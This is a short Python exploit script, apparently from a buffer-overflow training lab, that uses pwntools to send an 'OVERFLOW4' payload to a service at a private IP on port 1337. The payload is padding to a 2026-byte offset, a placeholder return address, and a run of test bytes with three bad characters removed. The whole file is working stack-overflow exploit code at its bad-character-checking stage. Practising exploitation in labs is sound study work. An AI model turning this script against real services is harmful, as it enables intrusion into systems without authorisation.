#!/usr/bin/env python3

from pwn import *

host = "10.10.129.151"
port = 1337

s = remote(host, port)
total_length = 3000
offset = 2026
new_eip = b"BBBB"
all_chars = bytearray(range(1,256))
bad_chars = [
    b"\xa9",
    b"\xcd",
    b"\xd4",

]

for bad_chars in bad_chars:
    all_chars = all_chars.replace(bad_chars, b"")

payload = [
    b"OVERFLOW4 ",
    b"A" * offset,
    new_eip,
    all_chars,
    b"C" * (total_length - offset - len(new_eip) - len(all_chars)),
]

payload = b"".join(payload)
s.send(payload)
s.close()